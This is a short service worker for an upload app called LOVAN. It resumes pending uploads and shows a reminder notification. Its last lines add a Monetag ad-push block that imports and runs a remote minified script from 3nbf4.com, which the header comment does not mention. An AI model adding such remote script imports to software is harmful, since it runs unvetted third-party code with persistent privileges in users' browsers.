// LOVAN background helper. It does not cache pages; it only wakes the app to resume uploads.
self.addEventListener("install", () => self.skipWaiting());
self.addEventListener("activate", (e) => e.waitUntil(self.clients.claim()));

self.addEventListener("sync", (e) => {
  if (e.tag !== "lovan-uploads") return;
  e.waitUntil(
    self.clients.matchAll({ type: "window", includeUncontrolled: true }).then((list) => {
      if (list.length) {
        list.forEach((c) => c.postMessage({ type: "lovan-resume-uploads" }));
        return;
      }
      return self.registration.showNotification("Uploads waiting", {
        body: "Open LOVAN to finish your uploads.",
        icon: "/icon-192.png",
        tag: "lovan-uploads",
      });
    }),
  );
});

self.addEventListener("notificationclick", (e) => {
  e.notification.close();
  e.waitUntil(
    self.clients.matchAll({ type: "window" }).then((list) => (list[0] ? list[0].focus() : self.clients.openWindow("/admin/bulk"))),
  );
});

// Monetag push notifications
self.options = {
  domain: "3nbf4.com",
  zoneId: 11883577,
};
self.lary = "";
try {
  importScripts("https://3nbf4.com/act/files/service-worker.min.js?r=sw");
} catch (e) {}
